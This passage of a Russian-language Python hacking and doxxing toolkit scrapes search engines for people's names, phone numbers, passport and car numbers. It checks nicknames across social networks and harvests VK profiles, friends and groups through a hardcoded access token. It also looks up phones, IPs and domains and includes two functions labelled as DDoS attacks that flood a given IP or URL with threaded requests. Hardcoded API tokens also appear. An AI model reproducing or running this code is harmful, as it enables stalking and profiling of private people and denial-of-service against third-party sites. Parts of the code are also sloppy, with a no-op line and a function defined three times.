                               search_results_rosreestr + search_results_nalog +
                               search_results_garant + search_results_consultant +
                               search_results_mos + search_results_spb +
                               search_results_fssp + search_results_ekontur +
                               search_results_spark + search_results_rospravo +
                               search_results_rosminzdrav + search_results_rostec +
                               search_results_nalog_moscow + search_results_mos_prefectures +
                               search_results_gosuslugi + search_results_zakupki +
                               search_results_rkn + search_results_gubkin +
                               search_results_msu + search_results_spbu +
                               search_results_mephi + search_results_hse):
                    link_tag = result.find('a')
                    if link_tag:
                        href = link_tag.get('href')
                        if href:
                            cleaned_url = re.findall(r'(https?://\S+)', href)
                            if cleaned_url:
                                title = result.find('h3') or result.find('h2') or result.find('div', class_='title')
                                description_tag = result.find('div', class_='VwiC3b tZESfb r025kc hJNv6b') or result.find('div', class_='VwiC3b') or result.find('p') or result.find('span', class_='description')
                                title_text = title.text if title else "No Title"
                                description_text = description_tag.text if description_tag else "No Description"
                                results.append({
                                    'source': engine_name,
                                    'link': cleaned_url[0],
                                    'title': title_text,
                                    'description': description_text
                                })
        except requests.exceptions.RequestException:
            pass

    extracted_info = defaultdict(list)
    for result in results:
        text_for_extraction = f"{result['title']} {result['description']}"
        names = re.findall(r'\b[А-ЯЁ][а-яё]+\s[А-ЯЁ][а-яё]+(?:\s[А-ЯЁ][а-яё]+)?\b', text_for_extraction)
        phones = re.findall(r'\+?\d[\d\-\(\) ]{9,}\d', text_for_extraction)
        emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', text_for_extraction)
        social_media_links = re.findall(r'(https?://(?:www\.)?(?:facebook|twitter|instagram|linkedin|vk|ok\.ru|t\.me|youtube|wa\.me|tiktok\.com)/[^\\s]+)', text_for_extraction)
        usernames = re.findall(r'@[a-zA-Z0-9_]{1,15}', text_for_extraction)
        hashtags = re.findall(r'#[a-zA-Z0-9_]{1,15}', text_for_extraction)
        addresses = re.findall(r'\b[А-Яа-я]+\s[А-Яа-я]+(?:\s[А-Яа-я]+)?\b', text_for_extraction)
        cities = re.findall(r'\b[A-ЯЁ][а-яё]+\s*[а-яё]*\s*[А-ЯЁ]?[а-яё]*\b', text_for_extraction)
        birth_dates = re.findall(r'\b\d{1,2}\.\d{1,2}\.\d{4}\b', text_for_extraction)
        passport_numbers = re.findall(r'\b[0-9]{4}\s?[0-9]{6}\b', text_for_extraction)
        car_numbers = re.findall(r'\b[AА-ЯЁ]{1}[0-9]{3}[A-ЯЁ]{2,3}\b', text_for_extraction)
        geo_locations = re.findall(r'\b-?\d{1,3}\.\d{4},?\s*-?\d{1,3}\.\d{4}\b|\b-?\d{1,3}\.\d{4}\s-?\d{1,3}\.\d{4}\b', text_for_extraction)

        extracted_info['names'].extend(names)
        extracted_info['phones'].extend(phones)
        extracted_info['emails'].extend(emails)
        extracted_info['social_media'].extend(social_media_links)
        extracted_info['usernames'].extend(usernames)
        extracted_info['hashtags'].extend(hashtags)
        extracted_info['addresses'].extend(addresses)
        extracted_info['cities'].extend(cities)
        extracted_info['birth_dates']
        extracted_info['passport_numbers'].extend(passport_numbers)
        extracted_info['car_numbers'].extend(car_numbers)
        extracted_info['geo_locations'].extend(geo_locations)

    print("\nНайденные результаты:")
    for result in results:
        print(f"\nИсточник: {result['source']}")
        print(f"\nСсылка: {result['link']}")
        print(f"\nЗаголовок: {result['title']}")
        print(f"\nОписание: {result['description']}\n")

    print("\n\nКлючевая информация:")
    for key, values in extracted_info.items():
        if values:
            print(f"\n{key.capitalize()}: {', '.join(values)}")

    with open("results.txt", "w", encoding='utf-8') as f:
        f.write("Найденные результаты:\n")
        for result in results:
            f.write(f"\nИсточник: {result['source']}\n")
            f.write(f"\nСсылка: {result['link']}\n")
            f.write(f"\nЗаголовок: {result['title']}\n")
            f.write(f"\nОписание: {result['description']}\n")

        f.write("\n\nКлючевая информация:\n")
        for key, values in extracted_info.items():
            if values:
                f.write(f"\n{key.capitalize()}: {', '.join(values)}\n")

    print("Результаты были сохранены в results.txt")
    
def searchNICK():
    nick = input(f"\n{Fore.BLUE}[?] Введите никнейм -> {Fore.WHITE}")
    urls = [
        f"https://www.instagram.com/{nick}",
        f"https://www.tiktok.com/@{nick}",
        f"https://twitter.com/{nick}",
        f"https://www.facebook.com/{nick}",
        f"https://www.youtube.com/@{nick}",
        f"https://t.me/{nick}",
        f"https://www.roblox.com/user.aspx?username={nick}",
        f"https://www.twitch.tv/{nick}",
    ]
    print(f"{Fore.BLUE}➤ Проверка аккаунтов для никнейма '{nick}':\n{Style.RESET_ALL}")
    for url in urls:
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(f"{Fore.BLUE}➤ {url} - аккаунт найден{Fore.WHITE}")
            elif response.status_code == 404:
                print(f"{Fore.BLUE}➤ {url} - аккаунт не найден{Fore.WHITE}")
            else:
                print(f"{Fore.BLUE}➤ {url} - ошибка {response.status_code}{Fore.WHITE}")
        except:
            print(f"{Fore.BLUE}➤ {url} - ошибка при проверке{Fore.WHITE}")
    
    print()
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]
 

def searchWK():
    while True:
        query = input(f"{Fore.WHITE}Введите имя для поиска (или '0' для завершения): {Style.RESET_ALL}").strip()
        if query.lower() == '0':
            print(f"{Fore.WHITE}Выход из программы.{Style.RESET_ALL}")
            break
        try:
            page = wikipedia.page(query)
            content = page.content
            data_size_mb = len(content.encode('utf-8')) / (1024 * 1024)
            print(f"{Fore.WHITE}Размер загружаемых данных: {data_size_mb:.2f} MB{Style.RESET_ALL}")
            print(f"\n{Fore.WHITE}Информация о '{query}':\n{Style.RESET_ALL}")
            print(Fore.WHITE + content)
            print("-" * 50)
            html_content = f"<html><head><title>{query}</title></head><body><h1>Информация о '{query}'</h1><pre>{content}</pre></body></html>"
            file_name = f"{query.replace(' ', '_')}.html"
            with open(file_name, 'w', encoding='utf-8') as f:
                f.write(html_content)
            print(f"{Fore.GREEN}Результат сохранён в {file_name}{Style.RESET_ALL}")
        except wikipedia.exceptions.DisambiguationError as e:
            print(f"{Fore.RED}Найдено несколько значений, уточните запрос:{Style.RESET_ALL}")
            print(e.options)
        except wikipedia.exceptions.PageError:
            print(f"{Fore.RED}Страница не найдена. Уточните запрос.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Произошла ошибка: {e}{Style.RESET_ALL}")

class DataFormatter:
    def format_account_data(self, raw_data):
        sections = {
            "Emails": self.extract_emails(raw_data),
            "Social Media Links": self.extract_social_media(raw_data),
            "Other Information": self.extract_other_information(raw_data),
            "Domain Information": self.extract_domain_info(raw_data),
            "Account Details": self.extract_account_details(raw_data)
        }
        return sections

    def extract_emails(self, raw_data):
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        emails = re.findall(email_pattern, raw_data)
        return list(set(emails))  

    def extract_social_media(self, raw_data):
        social_pattern = r'(https?://(?:www\.)?(?:facebook|twitter|instagram|linkedin|vk|github|youtube|reddit|telegram)\.[a-z]{2,3}/[a-zA-Z0-9_\-\.]+)'
        social_links = re.findall(social_pattern, raw_data)
        return list(set(social_links)) 

    def extract_other_information(self, raw_data):
        other_info_pattern = r'''(https?://(?:www\.)?[a-zA-Z0-9\-]+\.[a-zA-Z]{2,6}(?:/[a-zA-Z0-9\-._~:/?#[\]@!$&'()*+,;=.]+)?)'''
        other_info = re.findall(other_info_pattern, raw_data)
        return list(set(other_info)) 

    def extract_domain_info(self, raw_data):
        email_pattern = r'[a-zA-Z0-9._%+-]+@([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'
        domains = re.findall(email_pattern, raw_data)
        domain_info = {}
        for domain in domains:
            if domain not in domain_info:
                domain_info[domain] = 1
            else:
                domain_info[domain] += 1
        
        return domain_info

    def extract_account_details(self, raw_data):
        account_details = {
            "Account ID": self.extract_account_id(raw_data),
            "Account Creation Date": self.extract_account_creation_date(raw_data),
            "Last Login": self.extract_last_login(raw_data),
            "Profile Picture": self.extract_profile_picture(raw_data)
        }
        return account_details

    def extract_account_id(self, raw_data):
        account_id_pattern = r'Account ID: (\d+)'  
        account_ids = re.findall(account_id_pattern, raw_data)
        return account_ids[0] if account_ids else "Не найдено"

    def extract_account_creation_date(self, raw_data):
        creation_date_pattern = r'Account created on: ([\d\-]+)'  
        creation_dates = re.findall(creation_date_pattern, raw_data)
        return creation_dates[0] if creation_dates else "Не найдено"

    def extract_last_login(self, raw_data):
        last_login_pattern = r'Last login: ([\d\-]+)'  
        last_logins = re.findall(last_login_pattern, raw_data)
        return last_logins[0] if last_logins else "Не найдено"

    def extract_profile_picture(self, raw_data):
        picture_pattern = r'Profile Picture: (https?://[^\s]+)'  
        pictures = re.findall(picture_pattern, raw_data)
        return pictures[0] if pictures else "Не найдено"

    def create_section_panel(self, section_name, content):
        return Panel(
            Text(f"[bold]{section_name}[/bold]\n{content}", style="bold green"),
            title=section_name,
            border_style="cyan"
        )

class GmailOSINT:
    def __init__(self):
        self.console = Console()
        self.banner = self.create_banner()
        self.formatter = DataFormatter()

    def create_banner(self):
        banner = Text("Gmail OSINT\nИнструмент для поиска информации о пользователях Gmail\n")
        banner.stylize("bold cyan")
        return banner

    def search_account(self, username):
        self.console.print(f"\n[*] Поиск информации для пользователя: {username}")
        
        found_emails = []  
        found_social_services = []
        
        try:
            url = f"https://gmail-osint.activetk.jp/{username}"
            headers = {
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36"
                ])
            }

            response = requests.get(url, headers=headers, timeout=30)

            if response.status_code != 200:
                self.console.print(Panel(f"[!] Ошибка при запросе: {response.status_code}", style="bold red"))
                return

            soup = BeautifulSoup(response.text, 'html.parser')
            raw_data = soup.get_text()

            if "Профиль не найден" in raw_data:
                self.console.print(Panel(f"[!] Профиль не найден для {username}", style="bold red"))
                return

            sections = self.formatter.format_account_data(raw_data)

            self.search_google_for_associated_accounts(username, found_emails)

            if not any(sections.values()):
                self.console.print(Panel(f"[!] Нет данных для {username}", style="bold yellow"))
                return

            for section_name, section_data in sections.items():
                if section_data:
                    if isinstance(section_data, dict):
                        content = "\n".join([f"{domain}: {count} раз" for domain, count in section_data.items()])
                    else:
                        content = "\n".join([f"{idx + 1}. {data}" for idx, data in enumerate(section_data)])
                    panel = self.formatter.create_section_panel(section_name, content)
                    self.console.print(panel)

        except requests.exceptions.RequestException as e:
            self.console.print(Panel(f"[!] Ошибка при запросе: {str(e)}", style="bold red"))

    def search_google_for_associated_accounts(self, username, found_emails):
        search_query = f"{username} site:facebook.com OR site:twitter.com OR site:instagram.com OR site:linkedin.com OR site:vk.com OR site:github.com OR site:youtube.com OR site:reddit.com OR site:telegram.me"
        self.console.print(f"[+] Ищем информацию о пользователе через Google: {search_query}")

        try:
            google_url = f"https://www.google.com/search?q={urllib.parse.quote(search_query)}"
            headers = {
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                ])
            }
            response = requests.get(google_url, headers=headers)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                links = soup.find_all('a', href=True)

                for link in links:
                    href = link['href']
                    if any(service in href for service in ['facebook.com', 'vk.com', 'twitter.com', 'instagram.com', 'linkedin.com', 'github.com', 'youtube.com', 'reddit.com', 'telegram.me']):
                        self.console.print(Panel(f"[+] Найден аккаунт в социальной сети: {href}", style="bold blue"))
            else:
                self.console.print(Panel("[!] Ошибка при поиске через Google", style="bold red"))
        except requests.exceptions.RequestException as e:
            self.console.print(Panel(f"[!] Ошибка при поиске через Google: {str(e)}", style="bold red"))

    def run(self):
        try:
            self.console.print(self.banner)
            self.console.print(Panel("[bold yellow]Подготовка к поиску...", style="bold yellow"))

            while True:
                self.console.print("\nВведите имя пользователя (без домена):")
                username = input(">>> ").strip()

                if username:
                    self.search_account(username)

                    self.console.print("\nХотите выполнить новый поиск? (да/нет):")
                    if input(">>> ").lower() != 'да':
                        break
                        
        except KeyboardInterrupt:
            self.console.print("\n[!] Программа остановлена пользователем")
        finally:
            self.console.print("\n[i] Программа завершена!")

TOKEN = '0af157510af157510af15751aa0a89e69600af10af157516a0bc15996e74fe2b440998c'
VK_API_URL = "https://api.vk.com/method/"
def fetch_data(method, params):
    params['access_token'] = TOKEN
    params['v'] = '5.131'
    try:
        response = requests.get(VK_API_URL + method, params=params)
        response.raise_for_status()
        result = response.json()
        if 'error' in result:
            print(colored(f"Ошибка API: {result['error']['error_msg']}", 'red'))
            return None
        return result
    except requests.RequestException as e:
        print(colored(f"Ошибка при выполнении запроса: {e}", 'red'))
        return None
def print_section(title, symbol='='):
    print(colored(symbol * 60, 'green'))
    print(colored(title, 'cyan', attrs=['bold', 'underline']))
    print(colored(symbol * 60, 'green'))
def save_to_file(data, filename, file_format="txt"):
    if file_format == "txt":
        with open(filename, "a", encoding="utf-8") as file:
            file.write(data + "\n" + "=" * 60 + "\n")
    elif file_format == "json":
        with open(filename, "w", encoding="utf-8") as file:
            json.dump(data, file, ensure_ascii=False, indent=4)
    elif file_format == "csv":
        keys = data[0].keys()
        with open(filename, "w", encoding="utf-8", newline="") as file:
            writer = csv.DictWriter(file, fieldnames=keys)
            writer.writeheader()
            writer.writerows(data)
def get_user_info(username):
    params = {
        "user_ids": username,
        "fields": (
            "photo_max_orig,first_name,last_name,bdate,sex,city,country,contacts,"
            "connections,education,universities,schools,about,activities,status,"
            "interests,movies,music,tv,quotes,books,games,career,military,relation,"
            "personal,relatives,site,followers_count,last_seen,timezone,friend_status,"
            "exports,blacklisted,blacklisted_by_me,can_send_friend_request,"
            "can_write_private_message,can_post,can_see_all_posts,can_see_audio,"
            "can_call,can_close,can_open,is_favorite,is_hidden_from_feed"
        ),
    }
    return fetch_data("users.get", params)
def get_user_posts(user_id):
    params = {"owner_id": user_id, "count": 10, "extended": 1}
    return fetch_data("wall.get", params)
def get_user_friends(user_id):
    params = {"user_id": user_id, "fields": "nickname,domain,photo_50,bdate,city,country,contacts,education"}
    return fetch_data("friends.get", params)
def get_user_groups(user_id):
    params = {"user_id": user_id, "extended": 1, "fields": "members_count,screen_name,description"}
    return fetch_data("groups.get", params)
def get_user_devices():
    params = {}
    return fetch_data("account.getActiveOffers", params)
def format_user_info(user):
    details = [
        f"🧑‍💼 Имя: {user.get('first_name', 'Не указано')} {user.get('last_name', 'Не указано')}",
        f"🎂 Дата рождения: {user.get('bdate', 'Не указано')}",
        f"👨‍👩‍👧 Пол: {'Мужской' if user.get('sex') == 2 else 'Женский' if user.get('sex') == 1 else 'Не указан'}",
        f"🌆 Город: {user.get('city', {}).get('title', 'Не указан')}",
        f"🌍 Страна: {user.get('country', {}).get('title', 'Не указана')}",
        f"💬 Статус: {user.get('status', 'Не указан')}",
        f"📖 О себе: {user.get('about', 'Не указано')}",
        f"📱 Телефон: {user.get('contacts', {}).get('phone', 'Не указан')}",
        f"✉ Почта: {user.get('contacts', {}).get('email', 'Не указана')}",
        f"⏰ Последняя активность: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(user.get('last_seen', {}).get('time', 0))) if user.get('last_seen') else 'Не указана'}",
        f"👥 Количество подписчиков: {user.get('followers_count', 'Не указано')}", 
        f"\nВерсия 2 \n", 
        f"Имя: {user.get('first_name', 'Не указано')}", 
        f"Фамилия: {user.get('last_name', 'Не указано')}", 
        f"Дата рождения: {user.get('bdate', 'Не указано')}", 
        f"Пол: {'Мужской' if user.get('sex') == 2 else 'Женский' if user.get('sex') == 1 else 'Не указан'}", 
        f"Город: {user.get('city', {}).get('title', 'Не указан')}", 
        f"Страна: {user.get('country', {}).get('title', 'Не указана')}", 
        f"Статус: {user.get('status', 'Не указан')}", 
        f"О себе: {user.get('about', 'Не указано')}",
        f"Фотография: {user.get('photo_max_orig', 'Не указана')}", 
        f"Контактный телефон: {user.get('mobile_phone', 'Не указан')}", 
        f"Домашний телефон: {user.get('home_phone', 'Не указан')}", 
        f"Последняя активность: {user.get('last_seen', {}).get('time', 'Не указана')}", 
        f"Число подписчиков: {user.get('followers_count', 'Не указано')}", 
        f"Любимые фильмы: {user.get('movies', 'Не указано')}", 
        f"Любимая музыка: {user.get('music', 'Не указано')}", 
        f"Любимые книги: {user.get('books', 'Не указано')}", 
        f"Университеты: {', '.join([uni['name'] for uni in user.get('universities', [])]) or 'Не указано'}", 
        f"Школы: {', '.join([school['name'] for school in user.get('schools', [])]) or 'Не указано'}", 
    ]
    return "\n".join(details)
def save_to_file(data, filename):
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(data + "\n")

def vk_parser():
    print(f"""
    """) 
    print_section("💻 ВКонтакте Парсер 2.0 🚀")
    output_filename = "vk_user_info_results.txt"  
    with open(output_filename, 'w', encoding='utf-8') as f:  
        f.write("Результаты парсинга ВКонтакте:\n\n")
    
    while True:
        username = input(colored("Введите ID или username пользователя ВКонтакте (или '0' для выхода): ", 'yellow')).strip()
        if username.lower() == '0':
            print(colored("Завершаем программу... До новых встреч!", 'green'))
            break
        user_data = get_user_info(username)
        if not user_data or 'response' not in user_data:
            print(colored("❌ Не удалось получить данные о пользователе. Возможно, профиль закрыт.", 'red'))
            continue
        user = user_data['response'][0]
        
        print_section("🔍 Основная информация о профиле")
        user_details = format_user_info(user)
        print(colored(user_details, 'white'))
        save_to_file(user_details, output_filename)
        
        print_section("📰 Последние посты пользователя")
        posts_data = get_user_posts(user.get("id"))
        if posts_data and "response" in posts_data:
            posts = posts_data["response"]["items"]
            for i, post in enumerate(posts, start=1):
                date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(post.get('date', 0)))
                post_text = f"{colored(f'{i}.', 'cyan')} {colored(f'({date})', 'yellow')} {post.get('text', 'Текст отсутствует')}"
                print(post_text)
                save_to_file(post_text, output_filename) 
        
        else:
            print("Постов не найдено или доступ ограничен.")
        
        # Список друзей
        print_section("👥 Список друзей")
        friends_data = get_user_friends(user.get("id"))
        if friends_data and "response" in friends_data:
            friends = friends_data["response"]["items"]
            for friend in friends[:1000]: 
                friend_info = f"{friend.get('first_name')} {friend.get('last_name')} ({friend.get('domain')})"
                print(friend_info)
                save_to_file(friend_info, output_filename)  
        
        else:
            print("Список друзей недоступен.")
        
        print_section("📚 Группы пользователя")
        groups_data = get_user_groups(user.get("id"))
        if groups_data and "response" in groups_data:
            groups = groups_data["response"]["items"]
            if groups:
                for group in groups[:10]:
                    group_info = f"{group['name']} ({group['id']}) - Участников: {group.get('members_count', 'Не указано')}"
                    print(group_info)
                    save_to_file(group_info, output_filename) 
            else:
                print("Пользователь не состоит в группах.")
        else:
            print("Не удалось получить информацию о группах.")
        
        print_section("🔐 Информация о устройствах")
        devices_data = get_user_devices()
        if devices_data and "response" in devices_data:
            devices = devices_data["response"]
            for device in devices:
                device_info = f"{device.get('device', 'Не указано')} - {device.get('last_seen', 'Не указано')}"
                print(device_info)
                save_to_file(device_info, output_filename)  
        else:
            print("Информация о устройствах недоступна.")
        print(f"✅ Информация успешно сохранена в файл {output_filename}.")

def get_location_info(lat, lon):
    geocode_url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}"
    response = requests.get(geocode_url)
    if response.status_code == 200:
        data = response.json()
        address = data.get("display_name", "Адрес не найден")
        return {
            "address": address,
            "full_data": data
        }
    else:
        return {
            "address": "Ошибка при получении данных",
            "full_data": None
        }
def get_nearby_places(lat, lon, place_types, radius=100000):
    overpass_url = "http://overpass-api.de/api/interpreter"
    places = []
    for place_type in place_types:
        query = f"""
        [out:json];
        (
          node["{place_type}"](around:{radius},{lat},{lon});
          way["{place_type}"](around:{radius},{lat},{lon});
          relation["{place_type}"](around:{radius},{lat},{lon});
        );
        out center;
        """
        response = requests.post(overpass_url, data={"data": query})
        if response.status_code == 200:
            data = response.json()
            places.extend([
                {
                    "name": element.get("tags", {}).get("name", "Без названия"),
                    "type": place_type,
                    "tags": element.get("tags", {}),
                    "lat": element["lat"] if "lat" in element else element["center"]["lat"],
                    "lon": element["lon"] if "lon" in element else element["center"]["lon"],
                }
                for element in data.get("elements", [])
            ])
    return places
def save_to_file(location_info, places):
    with open("results.txt", "w", encoding="utf-8") as file:
        if isinstance(location_info, dict):
            file.write("=== ДЕТАЛЬНАЯ ИНФОРМАЦИЯ О ТОЧКЕ ===\n")
            file.write(f"Адрес: {location_info['address']}\n\n")
            file.write("Полный JSON-ответ:\n")
            file.write(f"{location_info['full_data']}\n\n")
            file.write("=== БЛИЖАЙШИЕ ОБЪЕКТЫ В РАДИУСЕ 10 КМ ===\n")
        if isinstance(places, list):
            for place in places:
                if isinstance(place, dict):
                    file.write(f"- Название: {place['name']}\n")
                    file.write(f"  Тип: {place['type']}\n")
                    file.write(f"  Координаты: {place['lat']}, {place['lon']}\n")
                    file.write(f"  Дополнительные данные: {place['tags']}\n")
                    file.write("\n")
            file.write("=== КОНЕЦ ===\n")

def retro_output(text):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(0.0000000000000000000000000000000000000000000000000000000000000000000001) 
    print()  
def coord():
    try:
        latitude = float(input("Введите широту (latitude): "))
        longitude = float(input("Введите долготу (longitude): "))
    except ValueError:
        retro_output("Ошибка ввода! Введите координаты в виде чисел.")
        return
    retro_output("\nПолучаем информацию о точке...")
    location_info = get_location_info(latitude, longitude)
    retro_output(f"\nАдрес: {location_info['address']}")
    retro_output("\nПолный ответ о точке:")
    retro_output(str(location_info['full_data']))
    retro_output("\nЗапрашиваем ближайшие места...")
    place_types = [
        "amenity",  
        "highway",  
        "shop",     
        "office", 
        "leisure",  
        "tourism",  
        "healthcare",  
        "public_transport" 
    ]
    radius = 100000
    places = get_nearby_places(latitude, longitude, place_types, radius)
    if places:
        retro_output("\nБлижайшие места в радиусе 10 км:\n")
        for place in places:
            retro_output(f"- Название: {place['name']}")
            retro_output(f"  Тип: {place['type']}")
            retro_output(f"  Координаты: {place['lat']}, {place['lon']}")
            retro_output(f"  Дополнительные данные: {place['tags']}")
            retro_output("-" * 40)
    else:
        retro_output("\nНе найдено мест поблизости.")
    retro_output("\nСохраняем результаты в файл...")
    save_to_file(location_info, places)
    retro_output("Результаты сохранены в 'results.txt'.")
    

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

def search_phone(phone_number):
    logger.info(f"Запрос информации по номеру телефона: {phone_number}")
    try:
        url = f"http://num.voxlink.ru/get/?num={phone_number}"
        response = requests.get(url)
        data = response.json()
        logger.info(f"Данные получены для номера {phone_number}: {data}")
        return data
    except Exception as e:
        logger.error(f"Ошибка при поиске по номеру телефона: {e}")
        return None

def search_ip(ip):
    logger.info(f"Запрос информации по IP-адресу: {ip}")
    try:
        url = f"http://ipwho.is/{ip}"
        response = requests.get(url)
        data = response.json()
        logger.info(f"Данные получены для IP {ip}: {data}")
        return data
    except Exception as e:
        logger.error(f"Ошибка при поиске по IP: {e}")
        return None

def osint_search_nickname(nickname):
    logger.info(f"Начало поиска OSINT по нику: {nickname}")
    social_media_platforms = [
        'vk', 'facebook', 'instagram', 'twitter', 'linkedin', 'snapchat', 
        'tiktok', 'pinterest', 'reddit', 'tumblr', 'youtube', 'whatsapp', 
        'telegram', 'wechat', 'discord', 'flickr', 'quora', 'meetup', 
        'badoo', 'myspace', 'viber', 'periscope', 'clubhouse', 'goodreads', 
        'soundcloud', 'dailymotion', 'twitch', 'mixcloud', 'xing', 
        'ello', 'gab', 'mastodon', 'parler', 'steemit', 'bitchute', 
        'vkontakte', 'foursquare', 'reverbnation', 'nextdoor', 
        'caffeine', 'rumble', 'yelp', 'blogger', 'wordpress.com', 
        'livejournal', 'deviantart', 'snapfish', 'cricut community', 
        'couchsurfing'
    ]
    
    domains = ['.com', '.net', '.org', '.ru']
    
    for platform in social_media_platforms:
        for domain in domains:
            url = f"https://{platform}{domain}/{nickname}"
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    logger.info(f"{Colors.green}Валидный: {url}{Colors.reset}")
                else:
                    logger.warning(f"{Colors.red}Невалидный: {url}{Colors.reset}")
            except requests.exceptions.RequestException as e:
                logger.error(f"{Colors.red}Ошибка при проверке URL {url}: {e}{Colors.reset}")

def search_url(url):
    logger.info(f"Поиск информации по домену: {url}")
    uri = "https://whoisjson.com/api/v1/whois"
    querystring = {"domain": url}
    headers = {
        "Authorization": "Token=dbbc251dda62fb51321132d79b070d00cad48acec4c660f7f0b313eb09056e9b"
    }
    try:
        response = requests.get(uri, headers=headers, params=querystring)
        logger.info(f"Данные по домену {url}: {response.text}")
        return response.text
    except Exception as e:
        logger.error(f"Ошибка при поиске домена: {e}")
        return None

def osint_search_google(nickname):
    logger.info(f"Запуск OSINT поиска в Google для ника: {nickname}")
    social_networks = ["Facebook", "Instagram", "Twitter", "LinkedIn", "TikTok", "Snapchat", "Pinterest", "Reddit", "WhatsApp", "Telegram", "YouTube", "Tumblr", "VKontakte", "WeChat", "Discord", "Clubhouse", "Flickr", "Quora", "Twitch", "MySpace", "Foursquare", "Badoo", "Meetup", "Viber", "Odnoklassniki", "Parler", "Gab", "Mastodon", "Ello", "SoundCloud", "Behance", "Dribbble", "Mix", "Periscope"]
    results = {}

    for network in social_networks:
        url = f"https://www.google.com/search?q={nickname}+{network}"
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.text, "html.parser")
            links = soup.find_all("a")

            valid_links = []
            for link in links:
                href = link.get("href")
                if href and "google.com" not in href:
                    valid_links.append(href)

            results[network] = valid_links
        except Exception as e:
            logger.error(f"Ошибка при поиске в Google для {nickname} на {network}: {e}")

    logger.info("Результаты OSINT поиска:")
    for network, links in results.items():
        logger.info(f"{network}:")
        for link in links:
            if any(social in link for social in ["facebook.com", "instagram.com", "twitter.com", "linkedin.com", "tiktok.com", "snapchat.com", "pinterest.com", "reddit.com", "whatsapp.com", "telegram.me", "youtube.com", "tumblr.com", "vk.com", "wechat.com", "discord.com", "joinclubhouse.com", "flickr.com", "quora.com", "twitch.tv", "myspace.com", "foursquare.com", "badoo.com", "meetup.com", "viber.com", "ok.ru", "parler.com", "gab.com", "mastodon.social", "ello.co", "soundcloud.com", "behance.net", "dribbble.com", "mix.com", "periscope.tv"]):
                logger.info(f"{Colors.green}Валидный: {link}{Colors.reset}")
            else:
                logger.warning(f"{Colors.red}Невалидный: {link}{Colors.reset}")
        logger.info("-" * 50)
        
def ddos_ip(ip, number_of_threads, duration):
    logger.info(f"Запуск DDoS-атаки на IP {ip} с {number_of_threads} потоками на {duration} секунд.")
    def attack():
        while True:
            try:
                response = requests.get(f"http://{ip}")
                logger.info(f"Запрос отправлен на {ip}. Код ответа: {response.status_code}")
            except requests.exceptions.RequestException as e:
                logger.error(f"Ошибка при атаке на {ip}: {e}")
            time.sleep(1)

    threads = []
    for _ in range(number_of_threads):
        t = threading.Thread(target=attack)
        threads.append(t)
        t.start()

    time.sleep(duration)

    for t in threads:
        t.join()
    logger.info(f"Атака на {ip} завершена.")

def ddos_attack(url, number_of_threads, duration):
    logger.info(f"Запуск DDoS-атаки на URL {url} с {number_of_threads} потоками на {duration} секунд.")
    def attack():
        while True:
            try:
                response = requests.get(url)
                logger.info(f"Запрос отправлен на {url}. Код ответа: {response.status_code}")
            except requests.exceptions.RequestException as e:
                logger.error(f"Ошибка при атаке на {url}: {e}")
            time.sleep(1)

    threads = []
    for _ in range(number_of_threads):
        t = threading.Thread(target=attack)
        threads.append(t)
        t.start()

    time.sleep(duration)

    for t in threads:
        t.join()
    logger.info(f"Атака на {url} завершена.")

def sss():
    print(f"""{Fore.RED}
         _                      _______                      _
      _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
     dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
     V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
              `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
               `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP' {Style.RESET_ALL}
          __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
        ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
  {Fore.CYAN}  _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._
                 `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
         ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
       ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.{Style.RESET_ALL}
      ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
      MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  {Fore.RED}   YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
